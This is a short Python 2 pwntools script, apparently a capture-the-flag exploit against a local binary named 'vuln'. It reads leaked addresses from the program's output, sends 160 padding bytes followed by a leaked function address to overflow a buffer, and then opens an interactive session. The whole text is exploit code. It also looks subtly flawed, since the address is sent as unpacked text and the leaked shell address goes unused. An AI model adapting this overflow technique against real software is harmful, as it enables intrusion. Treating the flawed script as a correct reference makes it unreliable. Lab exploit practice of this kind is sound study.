from pwn import *

p = process('./vuln')

p.recvuntil('write: ')
write_adr = p.recvline()
print 'write_adr: ' + write_adr
p.recvuntil('useful_string: ')
shell_adr = p.recvline()
print 'shell_adr: ' + shell_adr

p.recvuntil('string:\n')

pad = 'A'*160
p.sendline(pad + write_adr)

p.interactive()
